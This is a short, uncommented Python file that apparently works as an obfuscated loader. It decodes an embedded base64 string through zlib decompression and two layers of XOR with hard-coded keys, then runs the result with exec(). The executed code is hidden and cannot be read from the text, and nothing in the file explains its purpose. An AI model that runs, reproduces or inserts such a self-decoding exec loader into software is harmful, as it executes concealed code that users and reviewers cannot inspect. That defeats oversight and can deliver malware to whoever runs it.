# -*- coding: utf-8 -*-
import zlib,base64
def _x(d,k):
 o=bytearray()
 for i,b in enumerate(d):
  o.append(b^k[i%len(k)])
 return bytes(o)
_keys=[[169, 254, 220, 254, 56, 127, 181, 6, 210, 60, 112, 45, 232, 141, 26, 251], [207, 220, 233, 195, 139, 44, 155, 29, 29, 136, 196, 247, 74, 241, 176, 55]]
_d=(
    'eNoBYAGf/qqShoGgW9pYMrDvujnE/W6LuKvy/XnwXknn99wEu9Jwoq2EkNN94kt/v/26AsCbVL2EhJbzGOpodt6Wjj'
    'zD81CapNmN5lnzbXHGvbo8xMR7mrizrfh6ykdMvO+DKcTSbaS934jMbvl/f7z1kQ+khnb5mIuh8WWwbnLet5J7nIYE'
    'goSGpL9ZySUvsLWlOZ7AfIqSgqzkevBYStGMnSyV/3iikL6O2FvtbHnDoKQchuRhvJjbp/Jm0Gtw8P2xP7DKVZiNr6'
    'f/B64qcMWDlXKDxFiAk6vx/0CrWE7CtZsHyOhWouqAj9hv309Hvp6TD5rJVfmYpZD7fM9LcLivp3yc502XpIGK81/z'
    'VmvYvbg/u4l6iK+KtqBU0llPwZCYLrifBabqkKLcfe1MUf63jy+Y43X776ao8lywMnHk9aUynJscmI7cmf8HripwxY'
    'OVLcXEfojlu7r/VMlHKsKptjOwjQo6B9Fh'
)
for k in reversed(_keys):
 _d=base64.b64decode(_d);_d=zlib.decompress(_d);_d=_x(_d,k)
exec(_d.decode('utf-8'))
